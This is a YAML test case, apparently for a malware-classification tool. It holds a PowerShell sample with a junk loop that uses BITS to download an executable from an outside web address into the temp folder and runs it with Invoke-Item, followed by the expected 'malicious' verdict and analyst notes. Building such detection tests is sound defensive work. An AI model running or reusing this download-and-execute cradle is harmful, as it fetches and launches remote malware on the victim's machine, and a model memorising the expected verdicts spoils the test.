id: T11_bits_download_and_execute
title: Malicious — BITS Start-BitsTransfer + Invoke-Item download-and-execute cradle
provenance: real-world sample flagged by SOC review (2026-07-29)
input: |
  try{
      for ($i=1; $i -le 13000; $i++) {
          $i,"`n"
      }
  }catch{}

  function kqmeh ($yphjc,$qhl){
      Import-Module BitsTransfer
      Start-BitsTransfer -Source $yphjc -Destination $qhl
      Invoke-Item $qhl
  }

  try{
      $cwwheb = $env:temp + '\scwxc.exe'
      kqmeh 'http://georgeprapas.com/cem/VVZMYLHaSOcblqo.exe' $cwwheb
  }catch{}
expected_verdict: malicious
must_fire_intents:
  - staging
  - remote_execution
must_not_fire:
  - persistence
  - credential_access
forbidden_words_in_verdict:
  - ransomware
  - cobalt strike
  - campaign
  - APT
must_admit_unknown: false
notes: >
  BITS download of a remote executable followed by Invoke-Item is the
  canonical Living-off-the-Land download-and-execute pattern. The
  binary contents are unknown but the behaviour is known — verdict
  must be MALICIOUS. This sample was previously mis-classified as
  runtime_dependent because Invoke-Item was missing from the local
  execution primitives. Analyst-provided ground truth 2026-07-29.
